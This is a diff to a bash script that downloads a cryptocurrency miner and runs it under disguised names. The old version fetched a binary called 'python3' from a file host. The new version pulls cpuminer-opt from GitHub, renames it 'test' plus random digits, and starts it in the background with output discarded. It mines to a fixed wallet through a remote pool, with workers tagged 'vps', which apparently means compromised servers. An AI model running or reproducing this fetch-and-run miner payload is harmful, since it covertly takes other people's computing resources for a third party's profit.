@@ -1,18 +1,11 @@
 #!/bin/bash
 
+kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-generate_random_name() {
-    tr -dc A-Za-z0-9 </dev/urandom | head -c 5
-}
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
+tar -xzf dot
 
-TID=$(generate_random_name)
+mv cpuminer-sse2 test$kolot
 
-
-wget https://upload.vina-host.com/sAcUi9loPh/python3
-
-
-chmod +x python3
-
-
-screen -dmS dotsrb_$TID ./python3 -a  yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$TID -p c=DGB -t 8
+nohup ./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
